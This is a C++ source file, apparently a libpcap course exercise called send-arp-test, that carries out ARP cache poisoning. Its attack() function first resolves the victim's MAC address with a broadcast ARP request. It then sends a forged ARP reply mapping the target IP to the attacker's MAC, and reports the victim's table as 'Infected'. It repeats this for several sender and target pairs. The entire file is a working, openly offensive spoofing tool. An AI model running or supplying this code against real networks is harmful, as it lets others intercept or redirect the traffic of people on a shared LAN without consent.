#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "findaddr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

#define ARP_SIZE 42

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

void attack(char* dev, char* sender, char* target){

	// Err Setting
	char errbuf[PCAP_ERRBUF_SIZE];
	
	// Struct & Var Setting
	EthArpPacket packet;
	struct pcap_pkthdr *pkth;
	const u_char *pkt_data;
	int res;
	char mac_addr_att[20] = {0, };
	char ip_addr_att[20] = {0, };
	char mac_addr_send[20] = {0, };
	
	char cmp_ip[20];
	uint16_t cmp_proto;
	
	// Calculate Attacker's Mac Addr
	GetMacAddr(dev, mac_addr_att);

	// Calculate Attacker's IP Addr
	GetIpAddr(dev, ip_addr_att);
	
	
	////////////////////////////////////////////
	////////// Find Sender's Mac Addr //////////
	////////////////////////////////////////////
	
	pcap_t* hd_mac = pcap_open_live(dev, ARP_SIZE, 1, 1, errbuf);
	if (hd_mac == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		exit(1);
	}

	//////////*         Packet Header Structure         *//////////
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // Sender's Mac
	packet.eth_.smac_ = Mac(mac_addr_att);        // Attacker's Mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(mac_addr_att);        // Attacker's Mac
	packet.arp_.sip_ = htonl(Ip(ip_addr_att));    // Attacker's IP
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // Sender's Mac
	packet.arp_.tip_ = htonl(Ip(sender));         // Sender's IP
	/*/////////                                        //////////*/
	
	// Send Packet
	res = pcap_sendpacket(hd_mac, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(hd_mac));
		exit(1);
	}
	
	// Capture Packet
	do{
		res = pcap_next_ex(hd_mac, &pkth, &pkt_data);
		if (res != 1) {
			fprintf(stderr, "pcap_next_ex return %d error=%s\n", res, pcap_geterr(hd_mac));
			exit(1);
		}
		
		sprintf(cmp_ip, "%d.%d.%d.%d", pkt_data[28], pkt_data[29], pkt_data[30], pkt_data[31]);
		cmp_proto = ntohs(*(uint16_t*)(&pkt_data[12]));
		
	}while( cmp_proto != 0x0806 || strcmp(cmp_ip, sender) != 0);

	// Parse Sender's Mac Addr
	sprintf(mac_addr_send, "%02x:%02x:%02x:%02x:%02x:%02x", pkt_data[22], pkt_data[23], pkt_data[24], pkt_data[25], pkt_data[26], pkt_data[27]);
	
	pcap_close(hd_mac);
	
	printf("\n\n****Sender's Mac Addr Capture Success!!****\n\n");
	
	
	
	//////////////////////////////////////
	////////// ARP Table Attack //////////
	//////////////////////////////////////
	
	pcap_t* hd_attack = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (hd_attack == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		exit(1);
	}
	
	
	//////////*         Packet Header Structure         *//////////
	packet.eth_.dmac_ = Mac(mac_addr_send); // Sender's Mac
	packet.eth_.smac_ = Mac(mac_addr_att);  // Attacker's Mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(mac_addr_att);  // Attacker's Mac
	packet.arp_.sip_ = htonl(Ip(target));   // Target's IP
	packet.arp_.tmac_ = Mac(mac_addr_send); // Victim's Mac
	packet.arp_.tip_ = htonl(Ip(sender));   // Victim's IP
	/*/////////                                        //////////*/
	
	
	// Send Packet
	res = pcap_sendpacket(hd_attack, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(hd_attack));
		exit(1);
	}
	
	pcap_close(hd_attack);
	
	printf("\n\n****Sender's ARP Table is Infected!!****\n\n");
}

int main(int argc, char* argv[]) {

	if (argc%2 != 0 || argc < 4) {
		usage();
		return -1;
	}
	
	for(int i=1; i<=(argc-2)/2; i++){
		attack(argv[1], argv[i*2], argv[i*2+1]);
	}
}
